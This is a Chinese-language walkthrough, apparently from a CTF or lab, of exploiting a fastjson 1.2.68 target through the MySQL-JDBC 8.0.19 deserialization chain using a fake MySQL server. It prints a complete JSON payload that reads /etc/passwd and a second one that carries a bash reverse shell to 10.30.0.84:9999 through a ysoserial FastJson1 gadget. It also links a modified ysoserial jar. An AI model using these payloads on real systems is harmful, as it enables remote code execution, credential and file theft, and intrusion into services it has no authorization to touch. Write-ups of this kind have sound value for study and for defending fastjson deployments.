首先判断fastjson版本，1.2.68

![img](https://cdn.nlark.com/yuque/0/2023/png/26045928/1693361708315-5641ad48-7545-46d7-8836-8aac4e7122db.png)

看到在这个大版本下，首先的思路肯定是考虑文件写操作，就需要判断是否为JDK11或者存在commons-io等其他文件写入的依赖，但是该环境下都是不存在的。

![img](https://cdn.nlark.com/yuque/0/2023/png/26045928/1693361898043-07523d31-a2f9-4f7e-8b6c-e907a062660d.png)

除了文件写操作，还有一个利用更加简单且直接rce的方法：配合Mysql-JDBC反序列化打fastjson。

要求环境中存在JDBC的依赖，且对版本的要求也挺严格。 Mysql-JDBC在5、6、8下都存在相应的利用，所以就需要探测具体是什么版本。详细利用参考：[Fastjson全版本检测及利用-Poc](Fastjson全版本检测及利用-Poc.md#mysql-jdbc反序列化)

![img](https://cdn.nlark.com/yuque/0/2023/png/26045928/1693362502101-139f1c17-3dfc-464f-af32-6e35f25761fe.png)

显然这里使用的是mysql-connect-8.x

![img](https://cdn.nlark.com/yuque/0/2023/png/26045928/1693362513255-38abb596-43a1-4003-8253-8a61e9c2c013.png)

可是对于mysql-connect的版本为8下限制条件很大，只有一个版本可用：8.0.19

恰好环境是使用的8.0.19:

![img](https://cdn.nlark.com/yuque/0/2023/png/26045928/1693362734906-ce1f0b9f-ea59-437e-a1e1-67a02325259c.png)

那就好说了，先启动mysql-fake-server,用这个工具：https://github.com/fnmsd/MySQL_Fake_Server

`python3 server.py`启动mysql-fake-server：

先读文件测试漏洞是否可行：

```json
{
    "@type": "java.lang.AutoCloseable",
    "@type": "com.mysql.cj.jdbc.ha.ReplicationMySQLConnection",
    "proxy": {
        "@type": "com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy",
        "connectionUrl": {
            "@type": "com.mysql.cj.conf.url.ReplicationConnectionUrl",
            "masters": [
                {
                    "host": "10.30.0.84"
                }
            ],
            "slaves": [],
            "properties": {
                "host": "10.30.0.84",
                "user": "fileread_/etc/passwd",
                "dbname": "dbname",
                "password": "pass",
                "queryInterceptors": "com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor",
                "autoDeserialize": "true",
                "allowLoadLocalInfile": "true"
            }
        }
    }
}
```

成功！看来是可用的

![img](https://cdn.nlark.com/yuque/0/2023/png/26045928/1693363092287-d7b4a218-c63d-442a-9ac3-5b530f5ac1de.png)

后面就是反序列化了。

反序列化的话因为在之前说过，fastjson在全版本都存在原生反序列化，且环境依赖中并不存在其他的组件，看来只能配合原生反序列化了。

这里的话因为mysql-fake-server调用反序列化模块的原理是需要我们传入ysoserial工具然后执行命令获取数据并发送，但是在本身的ysoserial工具中并没有加入fastjson这条链的payload，所以需要在ysoserial中加入fastjson这条链。

这里是我添加FastJson1链后重新编译的ysoserial： [ysoserial-0.0.6-SNAPSHOT-all.jar](https://pan.baidu.com/s/1QQs0dH7I7UAz6r0BYzDGsg?pwd=7ji2)
当然也可以用其他师傅魔改后的ysoserial

![img](https://cdn.nlark.com/yuque/0/2023/png/26045928/1693375003333-f6be335c-9239-49fc-9baa-08d856bf804e.png)

上传到与server.py同目录即可读取。

发送数据：

```json
{
    "@type": "java.lang.AutoCloseable",
    "@type": "com.mysql.cj.jdbc.ha.ReplicationMySQLConnection",
    "proxy": {
        "@type": "com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy",
        "connectionUrl": {
            "@type": "com.mysql.cj.conf.url.ReplicationConnectionUrl",
            "masters": [
                {
                    "host": "10.30.0.84"
                }
            ],
            "slaves": [],
            "properties": {
                "host": "10.30.0.84",
                "user": "yso_FastJson1_bash -i >& /dev/tcp/10.30.0.84/9999 0>&1",
                "dbname": "dbname",
                "password": "pass",
                "queryInterceptors": "com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor",
                "autoDeserialize": "true",
                "allowLoadLocalInfile": "true"
            }
        }
    }
}
```

![img](https://cdn.nlark.com/yuque/0/2023/png/26045928/1693375349280-fcab912e-be6e-45dc-86cc-60a0be13a3ec.png)

反弹shell成功：

![image-20231021202442210](C:\Users\Hui\AppData\Roaming\Typora\typora-user-images\image-20231021202442210.png)
